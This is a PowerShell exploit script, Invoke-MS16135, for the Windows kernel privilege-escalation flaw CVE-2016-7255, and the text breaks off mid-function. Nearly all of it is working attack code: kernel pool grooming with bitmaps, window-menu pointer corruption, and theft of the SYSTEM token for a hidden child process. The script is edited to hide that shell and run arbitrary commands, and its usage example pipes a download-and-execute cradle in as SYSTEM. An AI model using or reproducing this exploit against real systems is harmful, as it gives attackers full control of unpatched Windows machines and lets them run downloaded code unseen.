function Invoke-MS16135 {
<#
    .SYNOPSIS
        
		PowerShell implementation of MS16-135 (CVE-2016-7255). 
		Discovered by Neel Mehta and Billy Leonard of Google Threat Analysis Group Feike Hacquebord, Peter Pi and Brooks Li of Trend Micro 
		Credit for the original PoC : TinySec (@TinySecEx)
		Credit for the Powershell implementation : Ruben Boonen (@FuzzySec)
        
        Targets:
        
        * Win7-Win10 (x64 only)
        
        Successfully tested on :
        
        * Win7 x64
        * Win8.1 x64
        * Win10 x64
        * Win2k12 R2 x64

    .DESCRIPTION

        Author: Ruben Boonen (@FuzzySec)
        Blog: http://www.fuzzysecurity.com/
        License: BSD 3-Clause
        Required Dependencies: PowerShell v2+
        Optional Dependencies: None

        EDIT: This script has been edited to include a parameter for custom commands and
        also hides the spawned shell. Many comments have also been removed and echo has
        moved to Write-Verbose. The original can be found at:
            https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1
        
    .EXAMPLE

        C:\PS> Invoke-MS16135 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"

        Description
        -----------
        Will run the iex download cradle as SYSTEM

#>
    [CmdletBinding()]
    param(

        [Parameter(Position=0,Mandatory=$True)]
        [String]
        $Command
    )

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct SQOS
	{
		public int Length;
		public int ImpersonationLevel;
		public int ContextTrackingMode;
		public bool EffectiveOnly;
	}

	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
		public static extern bool CreateProcessWithLogonW(
			String userName,
			String domain,
			String password,
			int logonFlags,
			String applicationName,
			String commandLine,
			int creationFlags,
			int environment,
			String currentDirectory,
			ref  STARTUPINFO startupInfo,
			out PROCESS_INFORMATION processInformation);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool SetThreadToken(
			ref IntPtr Thread,
			IntPtr Token);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenThreadToken(
			IntPtr ThreadHandle,
			int DesiredAccess,
			bool OpenAsSelf,
			out IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public extern static bool DuplicateToken(
			IntPtr ExistingTokenHandle,
			int SECURITY_IMPERSONATION_LEVEL,
			ref IntPtr DuplicateTokenHandle);
	}

	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentThread();
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern int GetThreadId(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetProcessIdOfThread(IntPtr handle);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int SuspendThread(IntPtr hThread);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool TerminateProcess(
			IntPtr hProcess,
			uint uExitCode);

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CloseHandle(IntPtr hObject);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool DuplicateHandle(
			IntPtr hSourceProcessHandle,
			IntPtr hSourceHandle,
			IntPtr hTargetProcessHandle,
			ref IntPtr lpTargetHandle,
			int dwDesiredAccess,
			bool bInheritHandle,
			int dwOptions);
	}


	[StructLayout(LayoutKind.Sequential)]
	public struct INPUT
	{
		public int itype;
		public KEYBDINPUT U;
		public int Size;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct KEYBDINPUT
	{
		public UInt16 wVk;
		public UInt16 wScan;
		public uint dwFlags;
		public int time;
		public IntPtr dwExtraInfo;
	}

	[StructLayout(LayoutKind.Sequential)] 
	public struct tagMSG  
	{  
		public IntPtr hwnd;
		public UInt32 message;
		public UIntPtr wParam;
		public UIntPtr lParam;
		public UInt32 time;
		public POINT pt;
	}

	public struct POINT
	{  
		public Int32 x;
		public Int32 Y;
	}

	public class ms16135
	{
		delegate IntPtr WndProc(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);

		[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
		struct WNDCLASSEX
		{
			public uint cbSize;
			public uint style;
			public IntPtr lpfnWndProc;
			public int cbClsExtra;
			public int cbWndExtra;
			public IntPtr hInstance;
			public IntPtr hIcon;
			public IntPtr hCursor;
			public IntPtr hbrBackground;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszMenuName;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszClassName;
			public IntPtr hIconSm;
		}
		
		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		static extern System.UInt16 RegisterClassW(
			[System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass);

		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr CreateWindowExW(
			UInt32 dwExStyle,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpClassName,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpWindowName,
			UInt32 dwStyle,
			Int32 x,
			Int32 y,
			Int32 nWidth,
			Int32 nHeight,
			IntPtr hWndParent,
			IntPtr hMenu,
			IntPtr hInstance,
			IntPtr lpParam);

		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		static extern System.IntPtr DefWindowProcW(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);

		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		public static extern bool DestroyWindow(
			IntPtr hWnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool UnregisterClass(
			String lpClassName,
			IntPtr hInstance);

		[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetModuleHandleW(
			[MarshalAs(UnmanagedType.LPWStr)]
			String lpModuleName);

		[DllImport("user32.dll", EntryPoint="SetWindowLongPtr")]
		public static extern IntPtr SetWindowLongPtr(
			IntPtr hWnd,
			int nIndex,
			IntPtr dwNewLong);

		[DllImport("user32.dll")]
		public static extern bool ShowWindow(
			IntPtr hWnd,
			int nCmdShow);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(
			IntPtr hWndChild,
			IntPtr hWndNewParent);

		[DllImport("user32.dll", SetLastError = false)]
		public static extern IntPtr GetDesktopWindow();

		[DllImport("user32.dll")]
		public static extern bool SetForegroundWindow(
			IntPtr hWnd);

		[DllImport("user32.dll", SetLastError=true)]
		public static extern void SwitchToThisWindow(
			IntPtr hWnd,
			bool fAltTab);

		[DllImport("user32.dll")]
		public static extern bool GetMessage(
			out tagMSG lpMsg,
			IntPtr hWnd,
			uint wMsgFilterMin,
			uint wMsgFilterMax);

		[DllImport("user32.dll")]
		public static extern bool TranslateMessage(
			[In] ref tagMSG lpMsg);

		[DllImport("user32.dll")]
		public static extern IntPtr DispatchMessage(
			[In] ref tagMSG lpmsg);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetFocus(
			IntPtr hWnd);

		[DllImport("user32.dll")]
		public static extern uint SendInput(
			uint nInputs, 
			[In] INPUT pInputs, 
			int cbSize);

		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);

		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			int cbBytes,
			IntPtr lpBits);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);

		public UInt16 CustomClass(string class_name)
		{
			m_wnd_proc_delegate = CustomWndProc;
			WNDCLASSEX wind_class = new WNDCLASSEX();
			wind_class.lpszClassName = class_name;
			///wind_class.cbSize = (uint)Marshal.SizeOf(wind_class);
			wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
			return RegisterClassW(ref wind_class);
		}

		private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			return DefWindowProcW(hWnd, msg, wParam, lParam);
		}

		private WndProc m_wnd_proc_delegate;
	}
"@

#==============================================================[Banner]
	$ms16135 = @"
	 _____ _____ ___   ___     ___   ___ ___ 
	|     |   __|_  | |  _|___|_  | |_  |  _|
	| | | |__   |_| |_| . |___|_| |_|_  |_  |
	|_|_|_|_____|_____|___|   |_____|___|___|
										
	                   [by b33f -> @FuzzySec]
					   
"@
	$ms16135

	if ([System.IntPtr]::Size -ne 8) {
		"`n[!] Target architecture is x64 only!`n"
		Return
	}

	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			Write-Verbose "[?] Target is Win 10"
			Write-Verbose "[+] Bitmap dimensions: 0x760*0x4`n"
		}

		'6.3' # Win8.1 / 2k12R2
		{
			Write-Verbose "[?] Target is Win 8.1"
			Write-Verbose "[+] Bitmap dimensions: 0x760*0x4`n"
		}

		'6.2' # Win8 / 2k12
		{
			Write-Verbose "[?] Target is Win 8"
			Write-Verbose "[+] Bitmap dimensions: 0x760*0x4`n"
		}

		'6.1' # Win7 / 2k8R2
		{
			Write-Verbose "[?] Target is Win 7"
			Write-Verbose "[+] Bitmap dimensions: 0x770*0x4`n"
		}
	}

	function Get-LoadedModules {

		Add-Type -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct SYSTEM_MODULE_INFORMATION
		{
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
			public UIntPtr[] Reserved;
			public IntPtr ImageBase;
			public UInt32 ImageSize;
			public UInt32 Flags;
			public UInt16 LoadOrderIndex;
			public UInt16 InitOrderIndex;
			public UInt16 LoadCount;
			public UInt16 ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			internal Char[] _ImageName;
			public String ImageName {
				get {
					return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
				}
			}
		}

		public static class Ntdll
		{
			[DllImport("ntdll.dll")]
			public static extern int NtQuerySystemInformation(
				int SystemInformationClass,
				IntPtr SystemInformation,
				int SystemInformationLength,
				ref int ReturnLength);
		}
"@

		[int]$BuffPtr_Size = 0
		while ($true) {
			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
			$SystemInformationLength = New-Object Int
		
			$CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
			
			if ($CallResult -eq 0xC0000004) {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
			}
			elseif ($CallResult -eq 0x00000000) {
				break
			}
			else {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				return
			}
		}

		$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
		$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
		if ([System.IntPtr]::Size -eq 4) {
			$SYSTEM_MODULE_INFORMATION_Size = 284
		} else {
			$SYSTEM_MODULE_INFORMATION_Size = 296
		}

		$BuffOffset = $BuffPtr.ToInt64()
		$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
		$BuffOffset = $BuffOffset + [System.IntPtr]::Size

		$SystemModuleArray = @()
		for ($i=0; $i -lt $HandleCount; $i++){
			$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
			$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
			
			$HashTable = @{
				ImageName = $Cast.ImageName
				ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
				ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
			}
			
			$Object = New-Object PSObject -Property $HashTable
			$SystemModuleArray += $Object
		
			$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
		}

		$SystemModuleArray

		# Free SystemModuleInformation array
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
	}

	function Stage-gSharedInfoBitmap {

		Add-Type -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;

		public static class gSharedInfoBitmap
		{
			[DllImport("gdi32.dll")]
			public static extern IntPtr CreateBitmap(
				int nWidth,
				int nHeight,
				uint cPlanes,
				uint cBitsPerPel,
				IntPtr lpvBits);

			[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			
			[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);

			[DllImport("user32.dll")]
			public static extern IntPtr CreateAcceleratorTable(
				IntPtr lpaccl,
				int cEntries);

			[DllImport("user32.dll")]
			public static extern bool DestroyAcceleratorTable(
				IntPtr hAccel);
		}
"@

		if ([System.IntPtr]::Size -eq 4) {
			$x32 = 1
		}

		function Create-AcceleratorTable {
			[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
			$AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
			$User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
			$gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
			if ($x32){
				$gSharedInfo = $gSharedInfo.ToInt32()
			} else {
				$gSharedInfo = $gSharedInfo.ToInt64()
			}
			$aheList = $gSharedInfo + [System.IntPtr]::Size
			if ($x32){
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc # _HANDLEENTRY.Size = 0xC
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
			} else {
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 # _HANDLEENTRY.Size = 0x18
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
			}

			$Result = @()
			$HashTable = @{
				Handle = $AccelHandle
				KernelObj = $phead
			}
			$Object = New-Object PSObject -Property $HashTable
			$Result += $Object
			$Result
		}

		function Destroy-AcceleratorTable {
			param ($Hanlde)
			$CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
		}

		$KernelArray = @()
		for ($i=0;$i -lt 20;$i++) {
			$KernelArray += Create-AcceleratorTable
			if ($KernelArray.Length -gt 1) {
				if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
					Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
					[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
					if ($OSMajorMinor -eq "6.1") { 
						$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, $Buffer) # Win7
					} else {
						$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, $Buffer) # Win8-10
					}
					break
				}
			}
			Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
		}

		$BitMapObject = @()
		$HashTable = @{
			BitmapHandle = $BitmapHandle
			BitmapKernelObj = $($KernelArray[$i].KernelObj)
			BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
		}
		$Object = New-Object PSObject -Property $HashTable
		$BitMapObject += $Object
		$BitMapObject
	}

	function Bitmap-Elevate {
		param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap)

		Add-Type -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		public static class BitmapElevate
		{
			[DllImport("gdi32.dll")]
			public static extern int SetBitmapBits(
				IntPtr hbmp,
				uint cBytes,
				byte[] lpBits);
			[DllImport("gdi32.dll")]
			public static extern int GetBitmapBits(
				IntPtr hbmp,
				int cbBuffer,
				IntPtr lpvBits);
			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern IntPtr VirtualAlloc(
				IntPtr lpAddress,
				uint dwSize,
				UInt32 flAllocationType,
				UInt32 flProtect);
			[DllImport("kernel32.dll", SetLastError=true)]
			public static extern bool VirtualFree(
				IntPtr lpAddress,
				uint dwSize,
				uint dwFreeType);
			[DllImport("kernel32.dll", SetLastError=true)]
			public static extern bool FreeLibrary(
				IntPtr hModule);
			[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);
		}
"@

		function Bitmap-Read {
			param ($Address)
			$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
			[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
			$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
			if ($x32Architecture){
				[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
			} else {
				[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
			}
			$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
		}
		
		function Bitmap-Write {
			param ($Address, $Value)
			$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
			$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
		}

		switch ($OSMajorMinor)
		{
			'10.0' # Win10 / 2k16
			{
				$UniqueProcessIdOffset = 0x2e8
				$TokenOffset = 0x358          
				$ActiveProcessLinks = 0x2f0
			}
		
			'6.3' # Win8.1 / 2k12R2
			{
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			}
		
			'6.2' # Win8 / 2k12
			{
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			}
		
			'6.1' # Win7 / 2k8R2
			{
				$UniqueProcessIdOffset = 0x180
				$TokenOffset = 0x208          
				$ActiveProcessLinks = 0x188
			}
		}
		
		Write-Verbose "`n[>] Leaking SYSTEM _EPROCESS.."
		$SystemModuleArray = Get-LoadedModules
		$KernelBase = $SystemModuleArray[0].ImageBase
		$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
		$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
		$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
		$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
		$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
		Write-Verbose "[+] _EPROCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
		$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
		Write-Verbose "[+] SYSTEM _EPROCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
		Write-Verbose "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
		Write-Verbose "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
		$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
		
		Write-Verbose "`n[>] Spawn child"
		
		$npipeName = Get-Random

		Write-Verbose "`n[>] Choosen name : $npipeName"
		
		$StartupInfo = New-Object STARTUPINFO
		$StartupInfo.dwFlags = 0x00000001
		$StartupInfo.wShowWindow = 0x00000000
		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
		$ProcessInfo = New-Object PROCESS_INFORMATION
		$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
		"user", "domain", "pass",
		0x00000002, "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe", " add-type -assemblyName `'System.Core`';`$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream(`'.`', `'$npipeName`', [System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader = `$pipeWriter = `$null;`$playerName = `'ping`';`$npipeClient.Connect();`$pipeWriter = new-object System.IO.StreamWriter(`$npipeClient);`$pipeReader = new-object System.IO.StreamReader(`$npipeClient);`$pipeWriter.AutoFlush = `$true;`$pipeWriter.WriteLine(`$playerName);IEX `$pipeReader.ReadLine();`$npipeClient.Dispose();",
		$null, $null, $GetCurrentPath,
		[ref]$StartupInfo, [ref]$ProcessInfo)


		add-type -assemblyName "System.Core"
		$npipeServer = new-object System.IO.Pipes.NamedPipeServerStream($npipeName, [System.IO.Pipes.PipeDirection]::InOut)
		$npipeServer.WaitForConnection()
		$pipeReader = new-object System.IO.StreamReader($npipeServer)
		$script:pipeWriter = new-object System.IO.StreamWriter($npipeServer)
		$pipeWriter.AutoFlush = $true
		$playerName = $pipeReader.ReadLine()
		
		if($playerName -eq "ping")
		{
			Write-Verbose "[+] Ping from child, voila"
		}
		
		Write-Verbose "[+] Child PID is : $("{0}" -f $ProcessInfo.dwProcessId)`n"
		
		Write-Verbose "`n[>] Leaking current _EPROCESS.."
		Write-Verbose "[+] Traversing ActiveProcessLinks list"
		$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		while($true) {
			$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
			if ($NextPID -eq $ProcessInfo.dwProcessId) {
				Write-Verbose "[+] PowerShell _EPROCESS address: 0x$("{0:X}" -f $NextProcess)"
				Write-Verbose "[+] PID: $NextPID"
				Write-Verbose "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
				$PoShTokenAddr = $NextProcess+$TokenOffset
				break
			}
			$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		}

		Write-Verbose "`n[!] Duplicating SYSTEM token!`n"

		Bitmap-Write -Address $PoShTokenAddr -Value $SysToken

		"`n[!] Success, spawning a system shell!"
		
		Write-Verbose "[!] Sending command to the elevated child"
		$pipeWriter.WriteLine($Command)
		$npipeServer.Dispose()	
		
	}

	function Sim-KeyDown {
		param([Int]$wKey)
		$KeyboardInput = New-Object KEYBDINPUT
		$KeyboardInput.dwFlags = 0
		$KeyboardInput.wVk = $wKey

		$InputObject = New-Object INPUT
		$InputObject.itype = 1
		$InputObject.U = $KeyboardInput
		$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
		
		$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
		if ($CallResult -eq 1) {
			$true
		} else {
			$false
		}
	}

	function Sim-KeyUp {
		param([Int]$wKey)
		$KeyboardInput = New-Object KEYBDINPUT
		$KeyboardInput.dwFlags = 2
		$KeyboardInput.wVk = $wKey
		
		$InputObject = New-Object INPUT
		$InputObject.itype = 1
		$InputObject.U = $KeyboardInput
		$InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject)
		
		$CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize)
		if ($CallResult -eq 1) {
			$true
		} else {
			$false
		}
	}

	function Do-AltShiftEsc {
		$CallResult = Sim-KeyDown -wKey 0x12 # VK_MENU
		$CallResult = Sim-KeyDown -wKey 0x10 # VK_SHIFT
		$CallResult = Sim-KeyDown -wKey 0x1b # VK_ESCAPE
		$CallResult = Sim-KeyUp -wKey 0x1b   # VK_ESCAPE
		$CallResult = Sim-KeyDown -wKey 0x1b # VK_ESCAPE
		$CallResult = Sim-KeyUp -wKey 0x1b   # VK_ESCAPE
		$CallResult = Sim-KeyUp -wKey 0x12   # VK_MENU
		$CallResult = Sim-KeyUp -wKey 0x10   # VK_SHIFT
	}

	function Do-AltShiftTab {
		param([Int]$Count)
		$CallResult = Sim-KeyDown -wKey 0x12    # VK_MENU
		$CallResult = Sim-KeyDown -wKey 0x10    # VK_SHIFT
		for ($i=0;$i -lt $count;$i++) {
			$CallResult = Sim-KeyDown -wKey 0x9 # VK_TAB
			$CallResult = Sim-KeyUp -wKey 0x9   # VK_TAB
		}
		$CallResult = Sim-KeyUp -wKey 0x12      # VK_MENU
		$CallResult = Sim-KeyUp -wKey 0x10      # VK_SHIFT
	}

	do {
		$Bitmap1 = Stage-gSharedInfoBitmap
		$Bitmap2 = Stage-gSharedInfoBitmap
		if ($Bitmap1.BitmapKernelObj -lt $Bitmap2.BitmapKernelObj) {
			$WorkerBitmap = $Bitmap1
			$ManagerBitmap = $Bitmap2
		} else {
			$WorkerBitmap = $Bitmap2
			$ManagerBitmap = $Bitmap1
		}
		$Distance = $ManagerBitmap.BitmapKernelObj - $WorkerBitmap.BitmapKernelObj
	} while ($Distance -ne 0x2000)

	Write-Verbose "[?] Adjacent large session pool feng shui.."
	Write-Verbose "[+] Worker  : $('{0:X}' -f $WorkerBitmap.BitmapKernelObj)"
	Write-Verbose "[+] Manager : $('{0:X}' -f $ManagerBitmap.BitmapKernelObj)"
	Write-Verbose "[+] Distance: 0x$('{0:X}' -f $Distance)"

	$TargetAddress = $WorkerBitmap.BitmapKernelObj + 63

	function Do-OrAddress {
		param([Int64]$Address)

		$AtomCreate = New-Object ms16135
		$hAtom = $AtomCreate.CustomClass("cve-2016-7255")
		if ($hAtom -eq 0){
			break
		}

		Write-Verbose "`n[?] Creating Window objects"
		$hMod = [ms16135]::GetModuleHandleW([String]::Empty)
		$hWndParent = [ms16135]::CreateWindowExW(0,"cve-2016-7255",[String]::Empty,0x10CF0000,0,0,360,360,[IntPtr]::Zero,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
		if ($hWndParent -eq 0){
			break
		}

		$hWndChild = [ms16135]::CreateWindowExW(0,"cve-2016-7255","cve-2016-7255",0x50CF0000,0,0,160,160,$hWndParent,[IntPtr]::Zero,$hMod,[IntPtr]::Zero)
		if ($hWndChild -eq 0){
			break
		}

		$Address = $Address - 0x28

		Write-Verbose "[+] Corrupting child window spmenu"
		$CallResult = [ms16135]::SetWindowLongPtr($hWndChild,-12,[IntPtr]$Address)

		$CallResult = [ms16135]::ShowWindow($hWndParent,1)
		$hDesktopWindow = [ms16135]::GetDesktopWindow()
		$CallResult = [ms16135]::SetParent($hWndChild,$hDesktopWindow)
		$CallResult = [ms16135]::SetForegroundWindow($hWndChild)

		Do-AltShiftTab -Count 4

		$CallResult = [ms16135]::SwitchToThisWindow($hWndChild,$true)

		Do-AltShiftEsc

		function Trigger-Write {
			$SafeGuard = [diagnostics.stopwatch]::StartNew()
			while ($SafeGuard.ElapsedMilliseconds -lt 3000) {
				$tagMSG = New-Object tagMSG
				if ($([ms16135]::GetMessage([ref]$tagMSG,[IntPtr]::Zero,0,0))) {
					$CallResult = [ms16135]::SetFocus($hWndParent) #
					for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        #
					$CallResult = [ms16135]::SetFocus($hWndChild)  # Bug triggers here!
					for ($i=0;$i-lt20;$i++){Do-AltShiftEsc}        #
					$CallResult = [ms16135]::TranslateMessage([ref]$tagMSG)
					$CallResult = [ms16135]::DispatchMessage([ref]$tagMSG)
				}
